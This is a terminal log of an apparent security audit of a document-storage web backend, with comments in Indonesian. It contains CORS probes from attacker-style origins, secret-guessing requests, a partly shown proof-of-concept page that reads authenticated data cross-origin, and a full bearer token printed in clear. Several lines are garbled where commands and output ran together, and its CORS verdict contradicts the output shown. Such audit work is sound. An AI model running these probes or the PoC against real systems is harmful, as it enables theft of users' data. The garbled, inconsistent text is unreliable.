@@ -1,0 +1,527 @@
+pathoskratos@pathos:~$ BE=https://web-production-c8591.up.railway.app
+
+# 1. ✅ Health OK (tidak crash loop)
+curl -sS "$BE/health" | jq
+
+# 2. ✅ Docs & OpenAPI MATI
+for p in /docs /redoc /openapi.json; do
+  code=$(curl -sS -o /dev/null -w '%{http_code}' "$BE$p")
+  echo "$p → $code (harus 404)"
+done
+
+# 3. ✅ /cors-check MATI
+curl -sS -o /dev/null -w '/cors-check → %{http_code}\n' "$BE/cors-check"
+
+# 4. ✅ CORS attacker origin DITOLAK (tidak ada Access-Control-Allow-Origin)
+curl -sS -D - -o /dev/null -H "Origin: https://attacker.vercel.app" "$BE/health" \
+  | grep -i access-control || echo "✅ No CORS header for attacker"
+
+# 5. ✅ CORS legit origin DITERIMA
+curl -sS -D - -o /dev/null -H "Origin: https://clouddatadprd.vercel.app" "$BE/health" \
+  | grep -i access-control
+
+# Harus: "Internal server error" BUKAN PGRST116/invalid input syntax000-0000-000
+{
+  "status": "healthy"
+}
+/docs → 404 (harus 404)
+/redoc → 404 (harus 404)
+/openapi.json → 404 (harus 404)
+/cors-check → 404
+access-control-allow-credentials: true
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+access-control-allow-credentials: true
+access-control-allow-origin: https://clouddatadprd.vercel.app
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+cron no-secret → 401
+cron bad-secret → 401
+"Token tidak valid"
+pathoskratos@pathos:~$ 
+pathoskratos@pathos:~$ set +H
+cd ~/Documents/audit-clouddatadprd 2>/dev/null || mkdir -p ~/Documents/audit-clouddatadprd && cd ~/Documents/audit-clouddatadprd
+mkdir -p recon http api report exploit logs
+
+BE="https://web-production-c8591.up.railway.app"
+FE="https://clouddatadprd.vercel.app"
+TS=$(date +%Y%m%d-%H%M%S)
+
+echo "═══════════════════════════════════════════════════════════════"
+echo " POST-PATCH VERIFICATION — $TS"
+echo " Target: $BE"
+echo "═══════════════════════════════════════════════════════════════"
+
+# ─────────────────────────────────────────────────────────────────
+# 1. REGISTER + LOGIN FRESH
+# ─────────────────────────────────────────────────────────────────
+echo
+echo "─── [1] REGISTER + LOGIN ───"
+USER="post$(date +%s)"
+EMAIL="$USER@example.com"
+PASS="Pentest123AAaa"
+
+curl -sS -X POST "$BE/auth/register" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"username\":\"$USER\",\"password\":\"$PASS\"}" \
+  -o api/reg-$TS.json -w 'Register → [%{http_code}]\n'
+
+curl -sS -X POST "$BE/auth/login" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
+  -o api/login-$TS.json -w 'Login → [%{http_code}]\n'
+
+TOKEN=$(jq -r 'if type=="array" then .[0].access_token else .access_token end' api/login-$TS.json)
+MY_ID=$(jq -r 'if type=="array" then .[0].user.id else .user.id end' api/login-$TS.json)
+echo "Token len: ${#TOKEN}"
+echo "My UUID:   $MY_ID"
+echo "Log: $TS — semua file di api/*-$TS*"iE 'PGRST|invalid input' api/error-leak-postpatch-$TS.txt && echo '⚠️ BOCOR' || echo '✅ FIXED')"FIXED')"
+═══════════════════════════════════════════════════════════════
+ POST-PATCH VERIFICATION — 20261105-142951
+ Target: https://web-production-c8591.up.railway.app
+═══════════════════════════════════════════════════════════════
+
+─── [1] REGISTER + LOGIN ───
+Register → [200]
+Login → [200]
+Token len: 165
+My UUID:   c615579d-9427-4643-87d4-4e903054c175
+
+─── [2] CORS POST-PATCH (8 origins) ───
+=== Origin: https://attacker.vercel.app ===
+access-control-allow-credentials: true
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+
+=== Origin: https://attacker-evil.vercel.app ===
+access-control-allow-credentials: true
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+
+=== Origin: https://clouddatadprd.vercel.app ===
+access-control-allow-credentials: true
+access-control-allow-origin: https://clouddatadprd.vercel.app
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+
+=== Origin: https://www.clouddatadprd.vercel.app ===
+access-control-allow-credentials: true
+access-control-allow-origin: https://www.clouddatadprd.vercel.app
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+
+=== Origin: http://localhost:3000 ===
+access-control-allow-credentials: true
+access-control-allow-origin: http://localhost:3000
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+
+=== Origin: http://localhost:3001 ===
+access-control-allow-credentials: true
+access-control-allow-origin: http://localhost:3001
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+
+=== Origin: null ===
+access-control-allow-credentials: true
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+
+=== Origin: https://evil.com ===
+access-control-allow-credentials: true
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+
+─── VERDICT CORS ───
+✅ FIXED — attacker origin ditolak
+
+─── [3] EXPOSED ENDPOINT POST-PATCH ───
+/docs                     → 404 (22 bytes)
+/redoc                    → 404 (22 bytes)
+/openapi.json             → 404 (22 bytes)
+/cors-check               → 404 (22 bytes)
+/swagger                  → 404 (22 bytes)
+/swagger.json             → 404 (22 bytes)
+/api-docs                 → 404 (22 bytes)
+/openapi.yaml             → 404 (22 bytes)
+/openapi.yml              → 404 (22 bytes)
+/.openapi.json            → 404 (22 bytes)
+/v1/openapi.json          → 404 (22 bytes)
+
+─── [4] /share/* POST-PATCH ───
+  /share/1                                            /info → 404 | {"detail":"Link tidak valid"}
+  /share/2                                            /info → 404 | {"detail":"Link tidak valid"}
+  /share/test                                         /info → 404 | {"detail":"Link tidak valid"}
+  /share/00000000-0000-0000-0000-000000000000         /info → 404 | {"detail":"Link tidak valid"}
+
+─── [5] ERROR LEAK /docs/{uuid} POST-PATCH ───
+  /docs/00000000-0000-0000-0000-000000000000          → 500 | {"detail":{"detail":"Internal server error","code":"INTERNAL_ERROR","request_id":"dd08870d-33e1-4f0b-a5c8-d8c4e8f5b9dc"}}
+  /docs/1                                             → 500 | {"detail":{"detail":"Internal server error","code":"INTERNAL_ERROR","request_id":"a5489339-756b-4550-b3ec-6f51801ebb47"}}
+  /docs/test                                          → 500 | {"detail":{"detail":"Internal server error","code":"INTERNAL_ERROR","request_id":"2ca87902-6719-415a-acb1-3a49fbde3749"}}
+  /docs/c615579d-9427-4643-87d4-4e903054c175          → 500 | {"detail":{"detail":"Internal server error","code":"INTERNAL_ERROR","request_id":"e2fdef62-09c3-4d5f-9403-2b9668599468"}}
+
+─── VERDICT ERROR LEAK ───
+✅ FIXED — error message generik
+
+─── [6] CRON POST-PATCH ───
+  secret=''              → 401 | {"detail":"Unauthorized cron secret"}
+  secret='test'          → 401 | {"detail":"Unauthorized cron secret"}
+  secret='admin'         → 401 | {"detail":"Unauthorized cron secret"}
+  secret='secret'        → 401 | {"detail":"Unauthorized cron secret"}
+  secret='cron-secret'   → 401 | {"detail":"Unauthorized cron secret"}
+  secret='1'             → 401 | {"detail":"Unauthorized cron secret"}
+
+─── [7] AUTHENTICATED ENDPOINTS ───
+  /categories/                 → 200 (1543 bytes)
+  /files/                      → 200 (2 bytes)
+  /files/categories            → 200 (330 bytes)
+  /files/stats                 → 200 (101 bytes)
+  /drives/                     → 200 (2 bytes)
+  /drives/pool                 → 200 (42 bytes)
+  /collaborators/              → 200 (2 bytes)
+  /assignments/my              → 200 (2 bytes)
+  /conversions/jobs            → 200 (2 bytes)
+  /folders/                    → 200 (2 bytes)
+  /notifications/health        → 200 (266 bytes)
+  /files/monthly-folders       → 200 (2 bytes)
+
+─── [8] SUPABASE REST ENDPOINTS ───
+  (semua 404 — Supabase REST tidak expose di domain ini)
+
+─── [9] X-Request-ID LEAK ───
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+x-request-id: 3be28d10-bf35-413f-ad73-58e9777c16ce
+
+─── [10] UUID DISCOVERY ───
+  /collaborators/:
+  /drives/:
+  /assignments/my:
+
+─── [11] NUCLEI RE-SCAN ───
+  ✅ Nuclei tidak match — CORS reflect fixed untuk origin unik
+
+═══════════════════════════════════════════════════════════════
+ SUMMARY POST-PATCH
+═══════════════════════════════════════════════════════════════
+
+Files dihasilkan:
+-rw-rw-r-- 1 pathoskratos pathoskratos  598 Nov  5 14:30 api/auth-postpatch-20261105-142951.txt
+-rw-rw-r-- 1 pathoskratos pathoskratos 1983 Nov  5 14:30 api/cors-postpatch-20261105-142951.txt
+-rw-rw-r-- 1 pathoskratos pathoskratos  438 Nov  5 14:30 api/cron-postpatch-20261105-142951.txt
+-rw-rw-r-- 1 pathoskratos pathoskratos  744 Nov  5 14:30 api/error-leak-postpatch-20261105-142951.txt
+-rw-rw-r-- 1 pathoskratos pathoskratos  495 Nov  5 14:30 api/exposed-postpatch-20261105-142951.txt
+-rw-rw-r-- 1 pathoskratos pathoskratos  190 Nov  5 14:31 api/header-leak-postpatch-20261105-142951.txt
+-rw-rw-r-- 1 pathoskratos pathoskratos  401 Nov  5 14:30 api/login-20261105-142951.json
+-rw-rw-r-- 1 pathoskratos pathoskratos    0 Nov  5 14:31 api/nuclei-postpatch-20261105-142951.txt
+-rw-rw-r-- 1 pathoskratos pathoskratos  401 Nov  5 14:29 api/reg-20261105-142951.json
+-rw-rw-r-- 1 pathoskratos pathoskratos  400 Nov  5 14:30 api/share-postpatch-20261105-142951.txt
+-rw-rw-r-- 1 pathoskratos pathoskratos   59 Nov  5 14:31 api/supabase-postpatch-20261105-142951.txt
+
+─── VERDICT ───
+CORS attacker.vercel.app : ⚠️ REFLECT
+CORS attacker-evil       : ⚠️ REFLECT
+CORS localhost:3000      : ⚠️ WHITELIST
+Docs/OpenAPI exposed     : ✅ FIXED
+Error leak PGRST         : ✅ FIXED
+
+Log: 20261105-142951 — semua file di api/*-20261105-142951*
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+
+echo "─── CORS BYPASS TESTS ───"
+# Berbagai origin untuk coba bypass regex
+for origin in \
+  "https://attacker.vercel.app" \
+  "https://attacker-evil.vercel.app" \
+  "https://attacker.evil.vercel.app" \
+  "https://clouddatadprd.vercel.app.evil.com" \
+  "https://xclouddatadprdx.vercel.app" \
+  "https://clouddatadprd.vercel.app.attacker.vercel.app" \
+  "https://CLOUDDATADPRD.vercel.app" \
+  "https://clouddatadprd%2Evercel%2Eapp" \
+  "https://attacker.vercel.app.nip.io"; do
+  echo "── $origin ──"
+  curl -sS -D - -o /dev/null -H "Origin: $origin" "$BE/health" 2>/dev/null \
+    | grep -iE '^access-control-allow-origin'
+done
+─── CORS BYPASS TESTS ───
+── https://attacker.vercel.app ──
+── https://attacker-evil.vercel.app ──
+── https://attacker.evil.vercel.app ──
+── https://clouddatadprd.vercel.app.evil.com ──
+── https://xclouddatadprdx.vercel.app ──
+── https://clouddatadprd.vercel.app.attacker.vercel.app ──
+── https://CLOUDDATADPRD.vercel.app ──
+── https://clouddatadprd%2Evercel%2Eapp ──
+── https://attacker.vercel.app.nip.io ──
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cd ~/Documents/attack-vercel 2>/dev/null || mkdir -p ~/Documents/attack-vercel && cd ~/Documents/attack-vercel
+
+# Recreate PoC (sudah kamu punya, tapi refresh)
+cat > index.html <<'HTMLEOF'
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CORS PoC — YuditCloud (Post-Patch)</title>
+  <style>
+    body{font-family:monospace;padding:20px;background:#0a0a0a;color:#0f0}
+    pre{background:#1a1a1a;padding:10px;overflow:auto;max-height:500px;color:#fff}
+    .ok{color:#0f0}.fail{color:#f00}.info{color:#ff0}
+    button{padding:10px 20px;font-size:16px;margin:5px;background:#0f0;color:#000;border:none;cursor:pointer;font-weight:bold}
+  </style>
+</head>
+<body>
+<h1>🔓 CORS PoC — Post-Patch</h1>
+<p>Origin: <code id="origin"></code></p>
+<p>Backend: <code>https://web-production-c8591.up.railway.app</code></p>
+<button onclick="runTest()">▶ Test Cookie (credentials:include)</button>
+<button onclick="testWithToken()">🔑 Test Manual Token</button>
+<p>Status: <span id="status" class="info">idle</span></p>
+<pre id="out">Klik tombol...</pre>
+
+<script>
+const BE = 'https://web-production-c8591.up.railway.app';
+document.getElementById('origin').textContent = location.origin;
+
+const endpoints = ['/health', '/cors-check', '/categories/', '/files/categories',
+  '/files/stats', '/notifications/health', '/drives/pool', '/collaborators/'];
+
+async function testEndpoint(ep, headers={}) {
+  try {
+python3 -m http.server 3000nts/audit-clouddatadprd/api/token.txt)"lts, null, 2);n':'Bearer '+token}));
+Server: http://localhost:3000
+Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjNjE1NTc5ZC05NDI3LTQ2NDMtODdkNC00ZTkwMzA1NGMxNzUiLCJleHAiOjE3OTM5NTAyMDB9.QcZ6vtumTU0MitdFnhHJ5nKg_jneyUzSRaqcDWHpSRU
+Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
+127.0.0.1 - - [05/Nov/2026 14:32:55] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [05/Nov/2026 14:32:56] code 404, message File not found
+127.0.0.1 - - [05/Nov/2026 14:32:56] "GET /favicon.ico HTTP/1.1" 404 -
+^C
+Keyboard interrupt received, exiting.
+pathoskratos@pathos:~/Documents/attack-vercel$ # Di terminal lain, pastikan server jalan di 0.0.0.0:3000
+cd ~/Documents/attack-vercel
+python3 -m http.server 3000
+
+# Buka di browser: http://localhost:3000  ← PAKAI localhost, BUKAN 0.0.0.0
+Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
+127.0.0.1 - - [05/Nov/2026 14:38:27] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [05/Nov/2026 14:38:27] code 404, message File not found
+127.0.0.1 - - [05/Nov/2026 14:38:27] "GET /favicon.ico HTTP/1.1" 404 -
+^C
+Keyboard interrupt received, exiting.
+pathoskratos@pathos:~/Documents/attack-vercel$ cd ~/Documents/attack-vercel
+python3 -m http.server 3000
+Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
+
+pathoskratos@pathos:~/Documents/attack-vercel$ BE="https://web-production-c8591.up.railway.app"
+
+echo "=== CORS attacker ==="
+curl -sS -D - -o /dev/null -H "Origin: https://attacker.vercel.app" "$BE/health" | grep -i "allow-origin" || echo "✅ Ditolak"
+
+echo "=== CORS localhost ==="
+curl -sS -D - -o /dev/null -H "Origin: http://localhost:3000" "$BE/health" | grep -i "allow-origin" || echo "✅ Ditolak"
+
+echo "=== Docs exposed ==="
+for p in /docs /redoc /openapi.json /cors-check; do
+  printf '%-15s → %s\n' "$p" "$(curl -sS -o /dev/null -w '%{http_code}' "$BE$p")"
+done
+
+echo "=== Error leak ==="
+curl -sS -H "Authorization: Bearer $(cat ~/Documents/audit-clouddatadprd/api/token.txt)" \
+  "$BE/docs/00000000-0000-0000-0000-000000000000" | head -c 200
+=== CORS attacker ===
+✅ Ditolak
+=== CORS localhost ===
+access-control-allow-origin: http://localhost:3000
+=== Docs exposed ===
+/docs           → 404
+/redoc          → 404
+/openapi.json   → 404
+/cors-check     → 404
+=== Error leak ===
+{"detail":{"detail":"Internal server error","code":"INTERNAL_ERROR","request_id":"8baf9829-c061-4209-b9e5-3734a7fc14f2"}}pathoskratos@pathos:~/Documents/attack-vercel$ pathoskratos@pathos:~/Documents/attack-vercel$ cd ~/Documents/attack-vercel
+python3 -m http.server 3000
+Traceback (most recent call last):
+  File "<frozen runpy>", line 198, in _run_module_as_main
+  File "<frozen runpy>", line 88, in _run_code
+  File "/usr/lib/python3.12/http/server.py", line 1314, in <module>
+    test(
+  File "/usr/lib/python3.12/http/server.py", line 1261, in test
+    with ServerClass(addr, HandlerClass) as httpd:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socketserver.py", line 457, in __init__
+    self.server_bind()
+  File "/usr/lib/python3.12/http/server.py", line 1308, in server_bind
+    return super().server_bind()
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib/python3.12/socketserver.py", line 473, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+pathoskratos@pathos:~/Documents/attack-vercel$ set +H
+cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+TOKEN=$(cat api/token.txt)
+
+echo "═══════════════════════════════════════════════════════════════"
+echo " BUKTI FINAL: CORS LOCALHOST MASIH REFLECT (POST-PATCH)"
+echo "═══════════════════════════════════════════════════════════════"
+
+# 1. Bukti Header Reflect
+echo -e "\n[1] Request ke /health dengan Origin: http://localhost:3000"
+curl -sS -D - -o /dev/null -H "Origin: http://localhost:3000" "$BE/health" | grep -i access-control
+
+# 2. Bukti Data Leak (Dengan Token)
+echo -e "\n[2] Request ke /categories/ (Auth) dengan Origin: http://localhost:3000"
+curl -sS -D api/bukti-header-leak.txt \
+     -H "Origin: http://localhost:3000" \
+     -H "Authorization: Bearer $TOKEN" \
+     "$BE/categories/" -o api/bukti-data-leak.json
+
+echo "Headers yang diterima server:"
+grep -iE 'access-control|x-drive|x-request' api/bukti-header-leak.txt
+
+echo -e "\nData yang bocor (200 OK):"
+head -c 300 api/bukti-data-leak.json
+echo -e "\n..."
+
+echo "═══════════════════════════════════════════════════════════════"
+═══════════════════════════════════════════════════════════════
+ BUKTI FINAL: CORS LOCALHOST MASIH REFLECT (POST-PATCH)
+═══════════════════════════════════════════════════════════════
+
+[1] Request ke /health dengan Origin: http://localhost:3000
+access-control-allow-credentials: true
+access-control-allow-origin: http://localhost:3000
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+
+[2] Request ke /categories/ (Auth) dengan Origin: http://localhost:3000
+Headers yang diterima server:
+access-control-allow-credentials: true
+access-control-allow-origin: http://localhost:3000
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+x-request-id: 4bbfc2e0-74dd-4f39-adba-39178afe9ec6
+
+Data yang bocor (200 OK):
+{"default":[{"id":"default-Surat Masuk","name":"Surat Masuk","icon":"📨","color":"#6366f1","keywords":[],"is_default":true},{"id":"default-Surat Keluar","name":"Surat Keluar","icon":"📤","color":"#6366f1","keywords":[],"is_default":true},{"id":"default-BA (Berita Acara)","name":"BA (Berita Acara
+...
+═══════════════════════════════════════════════════════════════
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ ls -la ~/Documents/audit-clouddatadprd/api/bukti-*
+-rw-rw-r-- 1 pathoskratos pathoskratos 1543 Nov  5 14:41 /home/pathoskratos/Documents/audit-clouddatadprd/api/bukti-data-leak.json
+-rw-rw-r-- 1 pathoskratos pathoskratos  544 Nov  5 14:41 /home/pathoskratos/Documents/audit-clouddatadprd/api/bukti-header-leak.txt
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ GET /categories/ HTTP/2
+Host: web-production-c8591.up.railway.app
+Origin: http://localhost:3000
+Authorization: Bearer <JWT>
+
+HTTP/2 200
+access-control-allow-origin: http://localhost:3000
+access-control-allow-credentials: true
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+x-request-id: 4bbfc2e0-74dd-4f39-adba-39178afe9ec6
+
+Body:
+{
+  "default": [
+    {"id": "default-Surat Masuk", "name": "Surat Masuk", ...},
+    {"id": "default-Surat Keluar", "name": "Surat Keluar", ...},
+    ...
+  ]
+}
+Server closed connection without sending any data back at /usr/share/perl5/Net/HTTP/Methods.pm line 397.
+Host:: command not found
+Origin:: command not found
+bash: syntax error near unexpected token `newline'
+bash: HTTP/2: No such file or directory
+access-control-allow-origin:: command not found
+access-control-allow-credentials:: command not found
+access-control-expose-headers:: command not found
+x-request-id:: command not found
+Body:: command not found
+Command 'default:' not found, did you mean:
+  command 'defaults' from deb gnustep-base-runtime (1.29.0-7ubuntu2)
+Try: sudo apt install <deb name>
+{id:: command not found
+{id:: command not found
+...: command not found
+]: command not found
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ BE="https://web-production-c8591.up.railway.app"
+TOKEN="<JWT dari /auth/login>"
+
+# 1. CORS reflect
+curl -sS -D - -o /dev/null \
+  -H "Origin: http://localhost:3000" \
+  "$BE/health"
+
+# 2. Data leak
+curl -sS -D - \
+  -H "Origin: http://localhost:3000" \
+  -H "Authorization: Bearer $TOKEN" \
+  "$BE/categories/"
+HTTP/2 200 
+access-control-allow-credentials: true
+access-control-allow-origin: http://localhost:3000
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+content-type: application/json
+date: Thu, 05 Nov 2026 07:46:10 GMT
+server: railway-hikari
+vary: Origin
+x-railway-request-id: QUwH2sLpQo6Lu_gWFFmdQQ
+x-request-id: 2fd51090-3b45-4e09-97a2-373cf7e62ade
+content-length: 20
+x-hikari-trace: sin1.tr00
+x-railway-edge: sin1
+
+HTTP/2 401 
+access-control-allow-credentials: true
+access-control-allow-origin: http://localhost:3000
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, X-Request-ID, Content-Disposition, Content-Length
+content-type: application/json
+date: Thu, 05 Nov 2026 07:46:10 GMT
+server: railway-hikari
+vary: Origin
+x-railway-request-id: osgwwJNZThWINsMcBT7zVQ
+x-request-id: c272b772-aa99-4fe4-a049-51a4ed5e0f6a
+content-length: 30
+x-hikari-trace: sin1.d1nj
+x-railway-edge: sin1
+
+{"detail":"Token tidak valid"}pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+CORS PoC — Post-Patch
+Origin: http://localhost:3000
+
+Backend: https://web-production-c8591.up.railway.app
+
+▶ Test Cookie (credentials:include) 🔑 Test Manual Token
+Status: DONE — cek output
+
+[
+  {
+    "ep": "/health",
+    "status": 200,
+    "allowOrigin": null,
+    "allowCreds": null,
+    "len": 20,
+    "data": "{\"status\":\"healthy\"}"
+  },
+  {
+    "ep": "/cors-check",
+    "status": 404,
+    "allowOrigin": null,
+    "allowCreds": null,
+    "len": 22,
+    "data": "{\"detail\":\"Not Found\"}"
+  },
+  {
+    "ep": "/categories/",
+    "status": 200,
+    "allowOrigin": null,
+    "allowCreds": null,
+    "len": 1519,
+    "data": "{\"default\":[{\"id\":\"default-Surat Masuk\",\"name\":\"Surat Masuk\",\"icon\":\"📨\",\"color\":\"#6366f1\",\"keywords\":[],\"is_default\":true},{\"id\":\"default-Surat Keluar\",\"name\":\"Surat Keluar\",\"icon\":\"📤\",\"color\":\"#636"
+  },
+  {
+    "ep": "/files/categories",
+    "status": 200,
+    "allowOrigin": null,
+    "allowCreds": null,
+    "len": 330,
+    "data": "{\"categories\":[\"Surat Masuk\",\"Surat Keluar\",\"BA (Berita Acara)\",\"Surat Keputusan Pimpinan\",\"Surat Keputusan DPRD\",\"Surat Persetujuan Bersama\",\"SPJ (Surat Pertanggungjawaban)\",\"Notulen Banmus\",\"Notulen"
+  },
+  {
+    "ep": "/files/stats",
+    "status": 200,
+    "allowOrigin": null,
+    "allowCreds": null,
+    "len": 101,
+    "data": "{\"total_files\":0,\"total_si
+
